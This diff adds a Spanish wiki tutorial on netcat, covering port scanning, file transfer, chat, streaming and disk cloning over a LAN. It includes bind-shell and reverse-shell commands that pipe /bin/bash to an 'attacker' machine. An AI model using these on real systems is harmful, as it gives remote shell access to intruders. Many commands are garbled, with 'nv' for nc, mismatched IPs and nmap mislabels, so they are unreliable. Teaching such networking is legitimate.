@@ -1,0 +1,112 @@
+===== Netcat =====
+**netcat** o **nc** es una utilitario para transmisión en redes de datos, especialmente todo lo que tenga que ver con TCP, UDP, o los sockets de UNIX. 
+
+Es capaz de establecer conexiones TCP, enviar paquetes UDP, estar a la escucha en puertos TCP y UDP arbitrarios, efectuar escaneo de puertos, y manejar IPv4 e IPv6
+
+==== Opciones ====
+
+^Opciones ^Descripción ^
+|''-4'' |Fuerza a usar sólo IPv4 |
+|''-6'' |Fuerza a usar sólo IPv6 |
+|''-l'' |Escucha conexiones |
+|''-v'' |Salida verbosa |
+|''-n'' |Desactiva búsqueda de DNS en direcciones IP y hostnames |
+|''-p'' |Especifica el puerto de origen |
+|''-w'' |Indica el valor de timeout |
+|''-u'' |Usa UDP en lugar de la TCP |
+|''-k'' |Fuerza seguir escuchando después de desconectar |
+|''-z'' |Instruye a nmap a escanear demonios en escucha |
+|''-h'' |Muestra la ayuda de nmap |
+|''-x'' |Usa nmap con un proxy |
+
+====Uso====
+
+La sintaxis básica de netcat es:
+
+<code bash>nc opciones host puerto</code>
+
+===Escanear puertos y atrapar bandera===
+
+^Comando ^Descripción ^
+|<code bash>nc -zvn 192.168.59.1</code> |Escanea los puertos entre ''1'' y ''100''. |
+|<code bash>nc -zvn 192.168.59.1</code> |Escanea puerto ''80'', ''22'' y ''443''. |
+|<code bash>nc -zvn 192.168.59.1 80</code> |Sólo escanea puerto ''80'' |
+|<code bash>nc -zvn textp-plano.com 80</code> |Escanea puerto ''80'' en ''texto-plano.xyz'' |
+|<code bash>nc texto-plano.xyz/~fulana/bandera</code> |Toma ''bandera'' |
+
+===Abrir un shell remoto===
+
+Podremos abrir una sesión de shell a mano. Para ello, suponiendo que la IP del servidor es ''192.168.58.3'',
+
+^En la máquina de servicio: ^
+|<code bash>nc -nvlp 8888 -e /bin/bash</code> |Ponemos un proceso de Bash en escucha en el puerto ''8888''|
+^En la máquina cliente: ^
+|<code bash>nc -nv 192.168.59.3 8888</code> |Hacemos un proceso cliente que hable al servidor en ''192.168.59.3'' puerto ''8888''. |
+
+
+===Abrir un shell inverso===
+
+^Máquina atacante ^
+|<code bash>nc -nlvp 8888</code> |Escucha en puerto ''8888'' |
+^Máquina víctima ^
+|<code bash>nc 192.168.59.3 8888 -v -e /bin/bash</code> |Proceso de bash que emite en ''192.168.59.3'' ''8888'' |
+
+
+===Bajar archivos===
+Suponiendo que el emisor está en ''192.168.59.3'':
+
+^En el emisor ^
+|<code bash>nc -lvp 8888 < datos.txt</code> |Emite un flujo a partir de ''datos.txt'' por puerto ''8888'' a la LAN |
+^En el receptor ^
+|<code bash>nv -nv 192.168.59.3 8888 > data.txt </code> |recibe el flujo de ''192.168.59.3'' por puerto ''8888'' y lo almacena en ''datos.txt'' |
+
+
+===Subir archivos===
+Suponiendo que el receptor está en ''192.158.59.3'':
+^En el receptor:^
+|<code bash>nv -lvp 8888 > datos.txt</code> | |
+^En el emisor:^
+|<code bash>nv 192.168.59.3 8888 < datos.txt</code> | |
+
+
+===Comprimir y transferir===
+Para transferir directorios por la LAN, puede resultar muy útil comprimirlos al enviarlo, y descomprimirlos al recibirlo.
+
+Suponiendo que el emisor está en ''192.168.59.54'':
+
+^En el emisor: ^
+|<code bash>tar cfp - /respaldos | compress -c | nc 192.168.59.54 8888</code> | |
+^En el receptor: ^
+|<code bash>nc -l -p 8888 | uncompress -c | tar xvfp -</code> | |
+
+===Encriptar y transferir===
+Las transferencias de ficheros usando netcat por defecto no van encriptadas, y cualquiera en la LAN podría capturar los paqueets enviados, de manera que es muy útil encirptarlos antes de enviarlos.
+
+Suponiendo que la máquina que envía es ''192.168.59.3''
+^En la máquina emisora: ^
+|<code bash>nc -l -p 8888 | openssl enc -d -des3 -pass pass:contraseña > secreto.txt</code> | |
+^En la máquina receptora: ^
+|<code bash>openssl enc -des3 -pass pass:contraseña | nc 192.168.59.3 8888</code> | |
+
+===Aplicación de chat===
+Podremos practicar lo más sencillo que es generar una aplicación de chat sencilla, que permita usar un puerto (''8888'') para emitir paquetes de texto sin cifrado alguno. Suponiendo que el servidor esté en ''192.168.59.3''
+
+^En el servidor: ^
+|<code bash>nv -lvp 8888</code> | |
+^En el cliente: ^
+|<code bash>nv 192.168.59.3 8888</code> | |
+
+===Video streaming===
+Podremos hacer videostreaming, por ejemplo de una pantalla:
+
+^En el servidor: ^
+|<code bash>cat video.avi | nc -nvlp 8888</code> |Emite el fichero ''video.avi'' por el puerto ''8888'' |
+|<code bash>nc 192.168.59.3 8888 | mplayer -vo x11 -cache 3000 -</code> | |
+
+===Clonar unidad de Linux===
+Esta es una manera útil de clonar un sistema de archivos por la red LAN.
+Asumiendo que la máquina que envia está en ''192.168.59.''
+^En la máquina que envía: ^
+|<code bash>dd if=/dev/sbd | nc -l -p 8888</code> | |
+^En la máquina que recibe: ^
+|<code bash>nc -n 192.168.59.3 8888 | dd of=/dev/sdb</code> | |
